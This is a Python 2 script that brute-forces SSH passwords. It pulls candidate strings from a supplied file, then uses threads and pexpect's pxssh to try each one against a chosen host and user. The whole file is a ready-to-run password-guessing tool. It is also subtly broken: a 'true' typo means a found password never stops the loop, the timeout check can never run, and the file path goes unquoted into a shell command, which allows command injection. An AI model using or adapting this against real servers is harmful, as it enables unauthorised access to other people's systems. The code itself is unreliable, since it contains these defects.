#!/usr/bin/python

from pexpect import pxssh

import optparse

import commands

import time

from threading import *

 

max_connections = 5

connection_lock = BoundedSemaphore(value=max_connections)

Found = False

Fails = 0

 

def connect(host, user, password, release):

               global Found

               global Fails

 

               try:

                              s = pxssh.pxssh()

                              s.login(host, user, password)

                              print('[+] Password Found: ' + password)

                              Found = true

               except Exception as e:

                              if 'read_nonblocking' in str(e):

                                             Fails += 1

                                             time.sleep(5)

                                             connect(host, user, password, False)

                              elif 'syncronize with original prompt' in str(e):

                                             time.sleep(1)

                                             connect(host, user, password, False)

               finally:

                              if release: connection_lock.release()

 

def main():

               parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')

               parser.add_option('-H', dest="tgtHost", type="string", help='Specify target host')

               parser.add_option('-F', dest="passwdFile", type="string", help='Specify a file to pull strings from to create a password file')

               parser.add_option('-u', dest="user", type="string", help='Specify the user')

               (options, args) = parser.parse_args()

               host = options.tgtHost

               passwdFile = options.passwdFile

               user = options.user

 

               if host == None or passwdFile == None or user == None:

                              print(parser.usage)

                              exit(0)

               t = commands.getstatusoutput('strings %s > string.txt' % passwdFile)

               fn = open('string.txt', 'r')

               for line in fn.readlines():

                              if Found:

                                             print('[*] Exiting: Password found')

                                             exit(0)

                                             if Fails > 5:

                                                            print('[!] Exiting: To0 many socket timeouts')

                                                            exit(0)

                              connection_lock.acquire()

                              password = line.strip('\r').strip('\n')

                              print('[-] Testing: ' + str(password))

                              t = Thread(target=connect, args=(host, user, password, True))

                              child = t.start()

 

if __name__ == '__main__':

               main()
